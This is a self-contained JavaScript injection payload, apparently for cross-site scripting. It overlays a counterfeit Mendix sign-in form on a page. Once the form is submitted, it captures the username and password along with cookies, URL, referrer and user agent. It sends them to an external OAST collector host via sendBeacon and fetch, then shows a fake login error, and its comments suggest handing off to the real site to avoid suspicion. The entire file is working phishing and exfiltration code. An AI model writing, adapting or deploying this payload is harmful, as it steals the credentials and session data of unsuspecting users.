(function () {
  // ==== CONFIG ====
  var EXFIL    = "https://daqqb5agsqoclmpmuo5gzeamksj6apz4o.oast.site";                 // OAST (Interactsh/Collaborator) or your collector
  var REDIRECT = "https://appstore.home.mendix.com/";        // believable hand-off after submit
  // ================

  function loot(extra) {
    return Object.assign({
      url: location.href,
      origin: location.origin,
      ua: navigator.userAgent,
      referrer: document.referrer,
      cookies: document.cookie,           // only non-HttpOnly domain cookies will be here
      ts: Date.now()
    }, extra || {});
  }

  function exfil(obj) {
    var body = JSON.stringify(obj);
    // put it in BOTH the path/query (always logged by OAST) and the POST body
    var url  = EXFIL + "/c?d=" + encodeURIComponent(body);
    try { navigator.sendBeacon(url, body); } catch (e) {}
    try { fetch(EXFIL + "/c", { method: "POST", mode: "no-cors", keepalive: true, body: body }); } catch (e) {}
  }

  function render() {
    var wrap = document.createElement("div");
    wrap.id = "mx-sso-fake";
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:2147483647;background:#f5f6f8;" +
      "display:flex;align-items:center;justify-content:center;" +
      "font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif";
    wrap.innerHTML =
      '<div style="width:360px;max-width:92vw;background:#fff;border-radius:8px;' +
      'box-shadow:0 6px 24px rgba(0,0,0,.12);padding:32px 28px">' +
        '<div style="font-size:22px;font-weight:700;color:#0a1325;margin-bottom:4px">Mendix</div>' +
        '<div style="font-size:14px;color:#5b6472;margin-bottom:22px">Sign in to continue</div>' +
        '<form id="mx-sso-form" autocomplete="on">' +
          '<label style="display:block;font-size:13px;color:#333;margin:0 0 6px">Email / Username</label>' +
          '<input name="u" type="text" required autofocus ' +
            'style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #c9ced6;' +
            'border-radius:6px;font-size:14px;margin-bottom:16px">' +
          '<label style="display:block;font-size:13px;color:#333;margin:0 0 6px">Password</label>' +
          '<input name="p" type="password" required ' +
            'style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #c9ced6;' +
            'border-radius:6px;font-size:14px;margin-bottom:20px">' +
          '<button type="submit" ' +
            'style="width:100%;padding:11px;border:0;border-radius:6px;background:#0a4dbb;color:#fff;' +
            'font-size:15px;font-weight:600;cursor:pointer">Sign in</button>' +
          '<div id="mx-sso-err" style="display:none;color:#c0392b;font-size:13px;margin-top:14px">' +
            'The username or password you entered is incorrect.</div>' +
        '</form>' +
      '</div>';
    document.documentElement.appendChild(wrap);

    var f = document.getElementById("mx-sso-form");
    f.addEventListener("submit", function (ev) {
      ev.preventDefault();
      var u = (f.elements.u.value || "").trim();
      var p = f.elements.p.value || "";
      if (!u || !p) return;

      var btn = f.querySelector("button");
      btn.disabled = true; btn.textContent = "Signing in...";

      exfil(loot({ u: u, p: p }));

      // small delay so the request leaves before navigation; keepalive also covers it
      setTimeout(function () {
        document.getElementById("mx-sso-err").style.display = "block";
        btn.disabled = false; btn.textContent = "Sign in";
        // optional: hand off to the real site to look legitimate
        // location.assign(REDIRECT);
      }, 700);
    });
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", render);
  else render();
})();
